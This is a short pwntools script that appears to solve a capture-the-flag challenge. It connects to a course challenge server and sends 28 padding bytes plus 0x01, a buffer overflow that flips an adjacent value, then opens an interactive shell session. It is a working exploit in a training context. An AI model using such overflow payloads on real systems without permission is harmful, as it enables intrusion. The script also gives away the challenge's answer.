from pwn import *

with remote("chals.syssec.dk", 13333, level="debug") as rem:
    rem.sendline(b'A'*28 + b'\x01')
    rem.interactive()